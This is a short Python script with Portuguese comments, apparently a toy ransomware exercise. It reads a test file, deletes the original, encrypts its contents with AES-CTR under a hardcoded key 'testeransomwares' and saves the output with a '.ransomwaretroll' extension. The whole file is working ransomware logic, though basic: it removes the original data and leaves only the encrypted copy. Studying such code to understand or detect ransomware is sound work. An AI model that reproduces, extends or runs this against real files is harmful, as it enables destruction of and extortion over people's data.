import os
import pyaes 

# abrir o arquivo a ser criptografado
# copia o conteudo do arquivo
# armazenar o conteudo do arquivo em uma variável
file_name = "meu_teste.txt"
file = open(file_name, "rb")
file_data = file.read()
file.close()

# remove o arquivo que foi selecionado em file_name
os.remove(file_name)


#chave para criptografia
key = b"testeransomwares"
aes = pyaes.AESModeOfOperationCTR(key)

# criptografa o arquivo
crypted_data = aes.encrypt(file_data)

# salva o arquivo criptografado pyaes
new_file = file_name + ".ransomwaretroll"
new_file = open(f'{new_file}', "wb")
new_file.write(crypted_data)
new_file.close()

